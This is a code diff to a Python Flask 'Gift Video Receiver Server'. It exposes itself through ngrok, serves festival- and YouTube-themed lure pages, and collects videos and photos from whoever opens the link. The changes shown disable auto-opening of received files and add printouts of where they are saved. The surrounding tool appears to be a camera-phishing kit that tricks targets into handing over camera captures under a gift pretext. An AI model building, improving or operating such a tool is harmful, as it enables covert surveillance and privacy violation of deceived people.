@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server - Complete Terminal Menu
+Gift Video Receiver Server - Complete Terminal Menu (No Auto-Open)
 """
 
 import os
@@ -24,6 +24,7 @@ UPLOAD_FOLDER = 'gift_videos'
 PORT = 5000
 FESTIVAL_HTML = 'festival.html'
 YOUTUBE_HTML = 'youtube.html'
+AUTO_OPEN = False  # Set to False to disable auto-opening
 
 # ============================================
 # Flask Application
@@ -84,14 +85,17 @@ def upload_media():
         print(f"\n📹 Received {media_type} {len(received_files)}")
         print(f"   📁 {filename}")
         print(f"   📊 {file_info['size']:,} bytes")
+        print(f"   📂 Full path: {os.path.abspath(filepath)}")
         
-        try:
-            if sys.platform == 'linux':
-                subprocess.run(['xdg-open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            elif sys.platform == 'darwin':
-                subprocess.run(['open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except:
-            pass
+        # Auto-open is DISABLED
+        if AUTO_OPEN:
+            try:
+                if sys.platform == 'linux':
+                    subprocess.run(['xdg-open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                elif sys.platform == 'darwin':
+                    subprocess.run(['open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                pass
         
         return jsonify({'success': True, 'filename': filename}), 200
 
@@ -233,7 +237,6 @@ class GiftServer:
         
         print("\n❌ ngrok is not installed or not in PATH!")
         print("📥 Install from: https://ngrok.com/download")
-        print("   Or use: sudo apt install ngrok (if available)")
         return False
 
     def monitor_ngrok(self):
@@ -273,7 +276,6 @@ class GiftServer:
                 return True
             else:
                 print("⚠️ ngrok started but URL not found")
-                print("📋 Check http://localhost:4040 for the URL")
                 return False
                 
         except Exception as e:
@@ -297,6 +299,7 @@ class GiftServer:
         print(f"📁 Files saved in: {UPLOAD_FOLDER}/")
         print("-"*50)
         print("\n⏳ Waiting for first file...")
+        print("💡 Files will NOT auto-open. Check the folder manually.")
         
         try:
             last_count = 0
@@ -308,6 +311,9 @@ class GiftServer:
                     print(f"\n📹 Received {file_info['type']} {current_count}")
                     print(f"   📁 {file_info['filename']}")
                     print(f"   📊 {file_info['size']:,} bytes")
+                    print(f"   📂 Full path: {os.path.abspath(file_info['path'])}")
+                    print("\n   💡 To view the file, open it manually from the folder")
+                    print(f"   📁 cd {os.path.abspath(UPLOAD_FOLDER)}")
                     last_count = current_count
                     print(f"\n⏳ Waiting for next file...")
                 
@@ -392,9 +398,12 @@ class GiftServer:
                     print(f"   4. Captures {photos} photos")
                 print("   5. Files save to your computer!")
             
+            print("\n💡 Files will NOT auto-open. Check the folder manually:")
+            print(f"   📁 cd {os.path.abspath(UPLOAD_FOLDER)}")
+            print("   📂 ls -la")
             print("="*60)
             print("\n📋 Link printed above - copy it manually")
-            print(f"📁 Files saved in: {UPLOAD_FOLDER}/")
+            print(f"📁 Files saved in: {os.path.abspath(UPLOAD_FOLDER)}/")
             
             self.wait_for_files()
             
